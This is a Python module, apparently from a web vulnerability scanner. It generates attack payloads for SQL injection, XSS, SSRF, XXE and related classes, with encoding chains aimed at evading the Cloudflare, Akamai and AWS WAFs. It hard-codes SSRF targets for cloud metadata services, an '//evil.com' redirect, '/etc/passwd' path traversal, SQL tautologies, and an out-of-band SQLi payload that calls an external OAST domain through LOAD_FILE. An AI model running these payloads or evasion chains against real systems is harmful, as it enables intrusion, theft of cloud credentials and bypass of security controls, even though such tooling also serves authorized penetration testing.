from __future__ import annotations

import os
import itertools
import re
import uuid
import urllib.parse
from typing import Callable, Iterator, List, Optional

from core.paths import DATA_DIR

def load_corpus() -> dict[str, list[str]]:
    corpus: dict[str, list[str]] = {}
    base_dir = DATA_DIR / "wordlists"

    if not base_dir.exists(): return {}

    categories = ["sqli", "xss", "ssti", "ssrf", "xxe", "idor", "deserial"]
    for category in categories:
        cat_dir = base_dir / category
        if not cat_dir.exists(): continue

        corpus[category] = []
        for filename in os.listdir(cat_dir):
            if filename.endswith(".txt"):
                try:
                    with open(cat_dir / filename, "r", encoding="utf-8") as f:
                        corpus[category].extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
                except: continue
    return corpus

CORPUS = load_corpus()

_TRANSFORMS: list[tuple[str, Callable[[str], str]]] = [
    ("url_encode", lambda s: urllib.parse.quote(s, safe="")),
    ("double_url_encode", lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")),
    ("html_entity", lambda s: s.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;").replace('"', "&quot;")),
    ("unicode_escape", lambda s: "".join(f"\\u{ord(c):04x}" if ord(c) > 0x7A else c for c in s)),
    ("null_byte", lambda s: s + "%00"),
    ("case_shuffle", lambda s: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))),
    ("comment_inject", lambda s: re.sub(r"\s+", "/**/", s)),
    ("hex_encode", lambda s: "".join(f"%{ord(c):02x}" for c in s)),
    ("tab_newline", lambda s: s.replace(" ", "\t").replace("\n", "%0a")),
    ("unicode_full_width", lambda s: "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in s)),
    ("having_clause", lambda s: s.replace("OR 1=1", "GROUP BY 1 HAVING 1=1")),
]

_TRANSFORM_MAP = dict(_TRANSFORMS)
_WAF_CHAINS: dict[str, list[str]] = {
    "Cloudflare": ["url_encode", "case_shuffle", "unicode_escape", "comment_inject"],
    "Akamai": ["double_url_encode", "unicode_escape", "null_byte", "tab_newline", "unicode_full_width"],
    "AWS WAF": ["url_encode", "double_url_encode", "hex_encode", "comment_inject", "having_clause"],
}

_CONTEXT_PATTERNS = {
    "url": (["url", "redirect", "next", "return", "callback"], [
        "http://127.0.0.1/",
        "//evil.com",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/v1/instance",
    ]),
    "path": (["path", "file", "dir", "folder"], ["../../../etc/passwd", "file:///etc/passwd"]),
    "id": (["id", "user", "num", "count"], ["' OR '1'='1", "' OR 1=1--", "1 AND 1=1"]),
}

class Mutator:
    def __init__(self, oast_domain: Optional[str] = None):
        self.oast_domain = oast_domain

    def _get_oast_url(self) -> str:
        return f"{uuid.uuid4().hex}.{self.oast_domain or 'oast.local'}"

    def mutations(self, payload: str, waf: str | None = None, max_transforms: int = 2) -> Iterator[str]:
        yield payload
        order = _WAF_CHAINS.get(waf, [n for n, _ in _TRANSFORMS])
        for name in order:
            res = _TRANSFORM_MAP[name](payload)
            if res != payload: yield res

        for length in range(2, max_transforms + 1):
            for combo in itertools.combinations(order[:5], length):
                res = payload
                for name in combo: res = _TRANSFORM_MAP[name](res)
                if res != payload: yield res

    def mutate_json(self, data: any, category: str) -> Iterator[any]:
        if isinstance(data, dict):
            for k, v in data.items():
                for mv in self.mutate_json(v, category):
                    new = data.copy(); new[k] = mv; yield new
        elif isinstance(data, list):
            for i, v in enumerate(data):
                for mv in self.mutate_json(v, category):
                    new = list(data); new[i] = mv; yield new
        else:
            for p in self.context_aware_payloads("json", category): yield p["payload"]

    def mutate_graphql(self, query: str, category: str) -> Iterator[str]:
        for p, repl in [(r'\"([^\"]*)\"', '"{payload}"'), (r':\s*([0-9\.]+)', ': {payload}')]:
            for m in self.context_aware_payloads("gql", category):
                mut = re.sub(p, repl.format(payload=m["payload"]), query)
                if mut != query: yield mut

    def context_aware_payloads(self, param: str, category: str, waf: str | None = None) -> Iterator[dict]:
        param_l = param.lower()
        seen = set()

        for k, (keywords, payloads) in _CONTEXT_PATTERNS.items():
            if any(kw in param_l for kw in keywords):
                for p in payloads:
                    if p not in seen:
                        seen.add(p); yield {"payload": p, "category": category, "priority": "high"}

        for mut in self.corpus_mutations(category, waf=waf, max_transforms=1):
            if mut["payload"] not in seen:
                seen.add(mut["payload"]); yield {**mut, "priority": "normal"}

    def corpus_mutations(self, category: str, waf: str | None = None, max_transforms: int = 2) -> Iterator[dict]:
        payloads = list(CORPUS.get(category, []))
        if self.oast_domain:
            oast = self._get_oast_url()
            if category == "ssrf": payloads.append(f"http://{oast}/")
            elif category == "sqli": payloads.append(f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{oast}', '\\\\a'))--")

        for seed in payloads:
            for mut in self.mutations(seed, waf=waf, max_transforms=max_transforms):
                yield {"payload": mut, "category": category}
